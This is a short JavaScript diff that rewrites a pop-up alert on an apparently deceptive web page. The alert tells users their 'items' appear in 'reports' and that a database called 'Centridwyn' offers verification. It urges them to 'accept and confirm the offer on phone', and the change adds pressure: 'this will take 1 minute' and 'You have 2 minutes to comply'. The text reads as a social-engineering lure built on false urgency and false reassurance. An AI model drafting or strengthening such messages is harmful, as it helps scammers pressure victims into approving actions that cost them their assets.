@@ -54,7 +54,7 @@ confirmBtn.addEventListener('click', function () {
     .then(res => res.json())
     .then(data => {
       if (data.success) {
-        alert(`⚠️ ATTENTION‼️‼️ ${data.itemsCount} Item(s) involve on the reports, Database named Centridwyn offer verification for the item(s) involved, Accept and confirm the offer on phone see results on email. Your items won't be taken away since a verification offer‼️`);
+        alert(`⚠️ ATTENTION‼️‼️ ${data.itemsCount} Item(s) involve on the reports, Database named Centridwyn offer verification for the item(s) involved to be cleaned this will take 1 minute, Accept and confirm the offer on phone see results on email. Your items won't be taken away since a verification offer‼️ You have 2 minutes to comply.`);
       } else {
         alert(`❌ Failed: ${data.message}`);
       }
